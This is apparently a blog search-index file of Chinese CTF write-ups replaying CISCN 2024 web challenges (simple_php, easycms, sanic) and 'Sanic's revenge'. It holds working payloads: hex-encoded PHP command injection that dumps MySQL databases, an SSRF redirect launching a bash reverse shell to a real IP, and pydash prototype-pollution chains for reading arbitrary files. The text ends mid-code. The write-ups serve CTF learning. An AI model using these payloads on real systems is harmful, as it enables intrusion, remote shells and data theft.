<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Ciscn2024web复现</title>
    <url>/2024/07/30/Ciscn2024web%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">   <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">     <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>**<code>ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);</code>**：设置 <code>open_basedir</code> 配置选项，限制 PHP 只能访问 <code>/var/www/html/</code> 目录及其子目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p><code>**escapeshellcmd**</code> 是一个 PHP 内置函数，用于转义传递给 shell 的字符串，以防止命令注入攻击。它的主要作用是确保用户输入的字符串在作为 shell 命令的一部分执行时不会被解释为特殊字符或命令。这个函数会在某些有特殊含义的字符前添加反斜杠，从而使这些字符失去特殊含义。</p>
<p>eg:</p>
<p>假设有以下用户输入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;cat /etc/passwd; rm -rf /&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>使用 <code>escapeshellcmd</code> 转义后：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$escaped_input</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$escaped_input</span>;</span><br></pre></td></tr></table></figure>

<p>输出将会是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat\ /etc/passwd\;\ rm\ -rf\ /</span><br></pre></td></tr></table></figure>

<p>而且这里过滤了很多东西</p>
<p>跟着wp复现</p>
<p><code>php -r</code> 是 PHP 命令行界面（CLI）的一部分，它允许你直接在命令行中运行 PHP 代码，而无需创建一个文件来包含这些代码。<code>-r</code> 选项用于指定一段将被执行的 PHP 代码</p>
<p><img src="/imgs/2024%E5%B9%B47%E6%9C%8830%E6%97%A516%E7%82%B959%E5%88%86.png" alt="image-20240730165912695"></p>
<p>发现可以直接执行</p>
<p>那么我们这就可以命令执行</p>
<p>由于绕过的函数有些多，我们可以使用hex2bin()函数进行16进制转字符进行绕过</p>
<p>但发现直接<strong>php -r eval(hex2bin(73797374656d2827707327293b));</strong></p>
<p>行不通</p>
<p>发现hex2bin需要的参数是一个字符串类型的数字，直接两个双引号呢？</p>
<p>不行 gg 准备跑路</p>
<p>但是总有大佬能想出来</p>
<p><strong>substr()</strong> 这个就有点牛逼了</p>
<p>我们知道</p>
<p><strong>自动类型转换（Type Juggling）</strong></p>
<p>PHP 是一种弱类型语言，它支持自动类型转换，称为“类型杂耍”（type juggling）。这意味着 PHP 会在需要时自动将一种数据类型转换为另一种数据类型。这种转换在函数参数传递时特别常见。</p>
<p>当你传递一个数字给 <code>substr()</code> 的 <code>$string</code> 参数时，PHP 会自动将这个数字转换为字符串。这是因为 <code>substr()</code> 函数的<strong>第一个参数需要一个字符串</strong>，而 PHP 会尝试将传递的任何数据转换为期望的类型。</p>
<p>所以我们这里payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(Gu0f3n73797374656d28276c73202f27293b,6)));</span><br></pre></td></tr></table></figure>

<p>成功执行 </p>
<p>查找&#x2F;目录发现没东西 但是 ps 发现有sql进程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;&#x27;`;</span></span><br><span class="line">cmd=php+-r+<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27603b,<span class="number">6</span>)));</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B953%E5%88%86.png" alt="image-20240801105235342"></p>
<p>爆出库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select * from PHP_CMS.F1ag_Se3Re7;</span><br><span class="line">cmd=php+-r+eval(hex2bin(substr(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27603b,6)));</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B955%E5%88%86.png" alt="image_5"></p>
<p>还有个更简单的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases</span><br></pre></td></tr></table></figure>

<p>直接把所有库的所有数据查出来 然后找flag</p>
<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>hint:简单的cms，可以扫扫看？ 提示1： &#x2F;flag.php： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示2：github找一下源码?</p>
<p>找到源码</p>
<p><a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p>
<p>信息打点 发现这个cms的漏洞公示<a href="https://www.xunruicms.com/bug/">https://www.xunruicms.com/bug/</a></p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B908%E5%88%86.png" alt="image-20240801200813912"></p>
<p>定位路径xunruicms-master\dayrui\Fcms\Control\Api\Api.php</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B910%E5%88%86.png" alt="image-20240801201003706"></p>
<p>ssrf漏洞</p>
<p>定位这个函数<strong>dr_catcher_data</strong></p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240801201134900"></p>
<p>试了下输入本地不行</p>
<p>302跳转</p>
<p>自己vps上面构建302.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.149.246.169%2F2222%200%3E%261%22&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://vps:7777/ctf/302.php&amp;size=6666&amp;level=1</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240801201517830"></p>
<p>卡了？ 试了几次都这样 </p>
<p>gg 跑路 复现失败 ┭┮﹏┭┮</p>
<h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><p>依旧是这位大佬gxngxngxn</p>
<p>参考</p>
<p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
<p>进入src路由</p>
<p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>分析下这段 在&#x2F;login路由处我们需要绕过**user.lower() &#x3D;&#x3D; ‘adm;n’**的限制，由于这里是从session中读取，所以默认是会在分号处截断，直接传肯定是不行的</p>
<p>利用八进制绕过</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B926%E5%88%86.png" alt="image-20240801202640883"></p>
<p>原理之前DASCTF复现的时候讲过了</p>
<p>所以直接上操作</p>
<p>得到admin的session</p>
<p>进入admin</p>
<p>直接污染</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>得到flag名</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B908%E5%88%86.png" alt="image-20240801210841152"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>访问src 拿flag</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B910%E5%88%86.png" alt="image-20240801211003726"></p>
<h2 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h2><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2>]]></content>
      <categories>
        <category>ciscn</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Sanic&#39;s revenge(复现)</title>
    <url>/2024/07/24/Sanic-s-revenge-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>复现这个之前先要学习下python的原型链污染（未学┭┮﹏┭┮）</p>
<p>之前学了Nodejs原型链污染，Python原型链污染和Nodejs原型链污染的根本原理一样，Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法。</p>
<p>先看给的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">import</span> pydash  </span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">pass</span>  </span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)  </span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):  </span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span>  </span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):  </span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):  </span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]  </span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]  </span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:  </span><br><span class="line">        pollute = Pollute()  </span><br><span class="line">        pydash.set_(pollute, key, value)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)  </span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span>  </span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span>  </span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span>  </span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);  </span><br><span class="line">        <span class="comment"># 生成日志文件  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="comment"># 备份日志文件  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>我们看到Pollute 路由这段</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># 生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># 备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>这是一个处理 <code>/pollute</code> 路径的异步函数 <code>POLLUTE</code>，支持 <code>GET</code> 和 <code>POST</code> 方法。</li>
<li>解析请求的 JSON 数据，获取 <code>key</code> 和 <code>value</code>。</li>
<li>如果条件满足：<ul>
<li>创建一个 <code>Pollute</code> 实例。</li>
<li>使用 <code>pydash.set_</code> 函数 设置 <code>pollute</code> 实例的属性。</li>
<li>返回 “success” 文本。</li>
</ul>
</li>
<li>这个路由还设置了一个waf，如果触发了waf，就会将key和value的值写入&#x2F;tmp目录下的文件中</li>
</ul>
<p>payload:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这段json代码就是将file_or_directory设置为”&#x2F;“我的基础还是很薄弱所以我们分析这个payload</p>
<ol>
<li><p><strong><code>__class__</code></strong>: 访问当前对象的类。</p>
</li>
<li><p><strong><code>__init__</code></strong>: 访问类的构造函数。</p>
</li>
<li><p><strong><code>__globals__</code></strong>: 访问构造函数的全局命名空间，这允许攻击者访问应用的全局变量。</p>
</li>
<li><p><strong><code>app.router.name_index.__mp_main__</code></strong>: 试图访问Sanic应用的路由器中的<code>name_index</code>，其中<code>__mp_main__</code>表示模块的名称。</p>
</li>
<li><p><strong><code>.static.handler.keywords.file_or_directory</code></strong>: 最终目标是访问并修改静态文件处理器的<code>file_or_directory</code>属性。</p>
</li>
<li><p><code>&quot;/&quot;</code>: 设置的值为根目录。（补充  ：</p>
<p><code>file_or_directory</code> 这个属性的作用通常是用于指示文件处理器处理的是文件还是目录。攻击者试图通过修改 <code>file_or_directory</code> 属性，将其值设置为 <code>&quot;/&quot;</code>，可能导致服务器将根目录作为静态文件目录，从而暴露服务器上的敏感文件和目录。这种攻击利用了对关键属性缺乏适当验证和保护的漏洞。<br>）就可以实现任意文件读取</p>
</li>
</ol>
<p><img src="/imgs/8.png"></p>
<p>回显success，表面成功了</p>
<p>接着我们访问&#x2F;static&#x2F;proc&#x2F;1&#x2F;cmdline</p>
<p>inux系统中的<code>/proc</code>文件系统的路径，并通过应用的静态文件服务暴露出来</p>
<ul>
<li>**<code>/proc/1/cmdline</code>**：这是一个文件，包含启动进程ID为1的进程时使用的命令行参数。</li>
</ul>
<p><img src="/imgs/9.png"></p>
<p>显示当前的启动路径为&#x2F;bin&#x2F;bash&#x2F;start.sh</p>
<p>我们继续打开这个路径</p>
<p><img src="/imgs/10.png"></p>
<p>发现运行的py脚本</p>
<p><img src="/imgs/11.png"></p>
<p>给了丢失的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_log_dir</span>(<span class="params">n</span>):</span><br><span class="line">        ret = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">            letter = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">            Letter = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">            s = <span class="built_in">str</span>(random.choice([num, letter, Letter]))</span><br><span class="line">            ret += s</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">        </span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 